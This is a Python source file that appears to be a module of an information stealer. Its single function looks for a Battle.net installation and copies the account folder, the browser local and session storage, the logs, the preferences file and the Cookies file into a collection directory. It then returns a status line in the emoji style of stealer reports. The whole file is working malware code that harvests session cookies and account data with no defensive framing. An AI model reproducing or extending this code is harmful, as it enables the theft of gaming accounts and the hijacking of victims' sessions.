from os import sep,environ,makedirs,path
from shutil import copytree, copy2
from manager.logger import Log
from preferences.config import config

def BattleNet():
    user = environ['USERPROFILE']
    pathtofile = f'{user}\\{config.pathToLogs}'
    local = environ['USERPROFILE'] + sep + r'AppData\Local'
    msgInfo = ""
    if path.exists(f"{local}\\Battle.net\\Account"):
        folders= [
            r'\Battle.net\Account',
            r'\Battle.net\BrowserCaches\common\Local Storage',
            r'\Battle.net\BrowserCaches\common\Session Storage',
            r'\Battle.net\Logs'
        ]
        files= [
            r'\Battle.net\BrowserCaches\LocalPrefs.json',
            r'\Battle.net\BrowserCaches\common\Cookies'
        ]
        makedirs(f"{pathtofile}\\Games\\Battle.net")
        for folder in folders:
            try:
                copytree(f"{local}{folder}",f"{pathtofile}\\Games{folder}")
            except Exception as e:
                Log(f"BattleNet(folders) ---> {e}")
        for file in files:
            try:
                copy2(f"{local}{file}",f"{pathtofile}\\Games{file}")
            except Exception as e:
                Log(f"BattleNet(files) ---> {e}")
        msgInfo+="\n∟🎮Battle.net"
        return msgInfo
    else:
        Log("BattleNet ---> Not exist")
        return msgInfo